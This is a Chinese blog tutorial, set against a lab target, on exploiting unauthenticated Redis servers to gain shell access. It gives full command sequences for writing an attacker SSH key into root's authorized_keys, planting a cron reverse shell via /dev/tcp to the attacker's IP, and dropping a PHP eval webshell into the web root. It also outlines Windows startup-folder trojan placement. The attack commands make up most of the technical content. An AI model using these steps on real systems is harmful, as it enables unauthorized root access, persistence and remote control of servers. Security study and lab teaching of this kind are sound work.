**目录**

[Redis](#t0 "Redis")

[扫描](#t1 "扫描")

[未授权登录以及利用](#t2 "未授权登录以及利用")

 [一：写入SSH公钥，进行远程登录](#t3 " 一：写入SSH公钥，进行远程登录")

[二：定时任务反弹shell](#t4 "二：定时任务反弹shell")

[三：写入一句话木马](#t5 "三：写入一句话木马 ") 

[四：写入/etc/passwd文件](#t6 "四：写入/etc/passwd文件")

[Windows环境的Redis如何Getshell](#t7 "Windows环境的Redis如何Getshell")

[一、写入木马到开机启动目录(需重启)](#t8 "一、写入木马到开机启动目录(需重启)")

[二：写入木马到网站路径](#t9 "二：写入木马到网站路径")

* * *

Redis
=====

**Redis**是一个开源的使用ANSI C语言编写、支持网络、可基于[内存](https://so.csdn.net/so/search?q=%E5%86%85%E5%AD%98&spm=1001.2101.3001.7020)亦可持久化的日志型、**Key-Value**数据库，并提供多种语言的API。Redis默认使用 **6379** 端口。

**未授权访问漏洞**

那么Redis的未授权访问漏洞是如何产生的呢？由于Redis默认使用6379号端口，并且Redis默认是空密码而且默认允许远程连接。一些粗心的网络管理员在安装好Redis后，并没有去修改他的默认端口，而且也没有给他设置密码的话。这就让黑客有了可乘之机，黑客可以远程连接到该数据库。并且，如果Redis是以root身份运行的话，那么黑客就可以通过Redis数据库进行写入任何文件进行提权，从而操控该服务器。

这里我们拿一个靶机做实验，该靶机存在Redis未授权访问漏洞，于是，我们在windows端远程连接该靶机。

攻击机：192.168.10.27

靶机：192.168.10.32

扫描
--

我们直接用nmap进行扫描是发现不了6379漏洞的，因为nmap默认只会扫描前1000个端口。因为这里我们已经知道靶机开放了6379端口，所以就直接指定端口进行扫描。

![](https://img-blog.csdnimg.cn/20181129200730667.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

未授权登录以及利用
---------

Nmap扫描后发现主机的6379端口对外网开放，就可以用本地Redis远程客户端连接服务器了，连接后可以获取Redis敏感数据，也可以写入数据。我们可以用windows或者linux下的redis客户端进行[远程登录](https://so.csdn.net/so/search?q=%E8%BF%9C%E7%A8%8B%E7%99%BB%E5%BD%95&spm=1001.2101.3001.7020)，这里我就用windows远程登录了，linux懒得安装。

```
redis-cli.exe -h 192.168.10.32  #登录
```


![](https://img-blog.csdnimg.cn/20181129201152372.png)

redis数据库的一些基本操作 

```
info  #查看redis的信息和服务器信息      
flushall 删除所有数据      
del key  删除键为key的数据      
get key  获得参数key的数据
```


  **redis数据库的认证**

```
auth 密码
```


### ![](https://img-blog.csdnimg.cn/20190630223528243.png)

###  一：写入SSH公钥，进行远程登录

关于[SSH](https://so.csdn.net/so/search?q=SSH&spm=1001.2101.3001.7020)公私钥验证，我就不多讲了，传送门——> [ssh公私钥验证](https://blog.csdn.net/qq_36119192/article/details/82709867#Openssh%E5%85%AC%E7%A7%81%E9%92%A5%E9%AA%8C%E8%AF%81%EF%BC%9A "ssh公私钥验证")   ，文章中是在Linux下生成公私钥。

今天我要教的是在windows下利用XShell生成公私钥，然后验证登录。

打开XShell—>工具—>新建用户密钥生成向导—>下一步—>下一步

![](https://img-blog.csdnimg.cn/20181129202249270.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

我这里就用默认名称，密码为空密码，然后下一步—> 是 

![](https://img-blog.csdnimg.cn/20181129202300493.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

保存为文件，然后完成。然后[公钥](https://so.csdn.net/so/search?q=%E5%85%AC%E9%92%A5&spm=1001.2101.3001.7020)就会被保存到指定的路径下，我这里保存到了 redis 客户端的目录下，因为待会便于传输。我们打开 id\_rsa\_2048.pub ，在其开头和结尾加入几个回车换行，避免待会写入redis数据库中和Redis里其他缓存数据混合 。

注意：一定要在公钥的开头和结尾加入几个换行，不然会出错！！！

![](https://img-blog.csdnimg.cn/20181129202442479.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

然后我们现在如何将这个公钥传送到靶机的 /root/.ssh/ 目录下，并且重命名为  authorized\_keys 。

执行下面的操作

```
type id_rsa_2048.pub | redis-cli.exe -h 192.168.10.32 -x set j 　＃查看id_rsa_2048.pub的文件内容，并且键设置为　ｊ      
redis-cli -h 192.168.10.32  #登陆到该redis数据库      
config set dir /root/.ssh  #设置redis的工作路径为/root/.ssh      
config set dbfilename authorized_keys #设置保存文件名authorized_keys      
save #保存       
＃上面命令的意思就是，将我们id_rsa_2048.pub的文件内容写入到authorized_keys文件中，并且存放到/root/.ssh 目录下       
如果是redis有弱口令的话，我们可以      1
redis-cli -h 192.168.10.32      1
auth  123456      1
set jjj "\n\nssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAqkf5/rPR9oHUwbln2cTeFduQwhTK5QEz7E3M9gM2fqrXA13N3WDKlCOUctTfRb0IHVcTXddDIqjOwOAg8fXrVINotxeGggJiJ2VwWnvE4J2KlTJhgLrF1giNFWOGs+iywvgLxEFx/4zjwicK7Z9Knk54rLx/wNcuvaBp7SecPlz3itN6Jm2vZs322bmRq7jcrQGPYu/7OoNsy/cF2F4EwDPPB9VeDAkLfle9n2g1A1voqw9wHziABEkZjQg5iQ+jUpCbhFy4OXIhygTpSPE6PSs7e0sh4KmAx3V7cRjg+2wrNlyLbXd3JaNdbu6oDPRia8jyNVbFoBOuv3z1lqXiUw==\n\n"      1
config set dir /root/.ssh      1
config set dbfilename authorized_keys      1
save
```


![](https://img-blog.csdnimg.cn/20181129203231432.png)

![](https://img-blog.csdnimg.cn/20181129203850113.png)

然后我们现在就可以用XShell以私钥连接该主机了，注意，一定是以 **root** 用户的身份去登录

![](https://img-blog.csdnimg.cn/20181129204256204.png)

![](https://img-blog.csdnimg.cn/20181129211224452.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

可以看到我们已经登陆上了。并且可以在 /root/.ssh/ 目录下看到我们上传的 authorized\_keys 文件，正是由于这个文件的存在，我们才可以在本地用私钥登录。

![](https://img-blog.csdnimg.cn/20181129210910681.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### 二：定时任务反弹shell

我们可以将 linux 反弹 shell 的命令写入定时任务中，这样，我们就可以接收到redis服务器反弹过来的shell了

我们客户端先接收一个端口

```
nc -lvp 8888  #监听8888端口
```


然后执行下面的命令

```
redis-cli -h 192.168.10.32  #登陆到redis数据库      
set d "\n\n*/1  *  *  *  * /bin/bash -i>&/dev/tcp/192.168.10.27/8888 0>&1\n\n"  #意思是每隔一分钟，向192.168.10.27的8888端口反弹shell      
config set dir /var/spool/cron  #设置工作目录      
config set dbfilename root      #设置文件名，当前用户叫啥就得命名为啥，当前用户为root      
save                            #保存成文件       
＃上面这几行命令的意思就是将 "\n\n*/1 * * * * * /bin/bash -i>&/dev/tcp/192.168.10.27/8888 0>&1\n\n" 这条命令写入test文件中，并且存放在/var/spool/cron目录下
```


![](https://img-blog.csdnimg.cn/20181129210324265.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

可以看到，我们这边已经收到反弹回来的shell了 

![](https://img-blog.csdnimg.cn/20181129210422873.png)

### 三：写入一句话木马 

写入一句话木马需要我们知道网站的根目录相对于服务器的绝对路径。但是这个靶机网站的根目录相对于服务器的绝对路径很奇葩。不是普通的在  /var/www/html 下，而是在  /var/www/html/dedecms/uploads  这个目录下。

执行下列命令

```
redis-cli -h 192.168.10.32      
set one "\n\n\n<?php @eval($_POST['c']);?>\n\n\n"      
config set dir  /var/www/html/dedecms/uploads      
config set dbfilename webshell.php      
save
```


![](https://img-blog.csdnimg.cn/20181129222610968.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

然后用菜刀连接

![](https://img-blog.csdnimg.cn/20181129222940197.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

可以看到，已经连接成功了！

![](https://img-blog.csdnimg.cn/20181129223045994.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### 四：写入/etc/passwd文件

写入 /etc/passwd 文件，这需要使用 root 权限才可以写入。

Windows环境的Redis如何Getshell
-------------------------

### **一、写入木马到开机启动目录(需重启)**

这里主要里将木马放到系统的开机启动目录，然后用其他手段使之重启，然后getshell。这里的木马可以是MSF马或者CS生成的马

### 二：写入木马到网站路径

这个的前提是得知道网站的绝对路径，然后写入一句话木马到网站目录下，再连接。

关于windows环境redis getshell的相关文章：[Redis在Windows环境下Getshell方法小结](https://cloud.tencent.com/developer/article/1488184 "Redis在Windows环境下Getshell方法小结")

  如果想跟我一起讨论的话，就快加入我的知识星球吧。星球里有一千多位同样爱好安全技术的小伙伴一起交流！

![](https://img-blog.csdnimg.cn/1219ed79e9ed449d85d27b732cda5ea6.jpg)

参考文章：[Redis未授权访问详解](https://www.freebuf.com/column/158065.html "Redis未授权访问详解") 

相关文章：[redis安全学习小记](https://mp.weixin.qq.com/s/W9joCtUQfNA62ZWXwqMmsw "redis安全学习小记")

文章知识点与官方知识档案匹配，可进一步学习相关知识

[CS入门技能树](https://edu.csdn.net/skill/gml/gml-1c31834f07b04bcc9c5dff5baaa6680c)[Linux入门](https://edu.csdn.net/skill/gml/gml-1c31834f07b04bcc9c5dff5baaa6680c)[初识Linux](https://edu.csdn.net/skill/gml/gml-1c31834f07b04bcc9c5dff5baaa6680c)10949 人正在系统学习中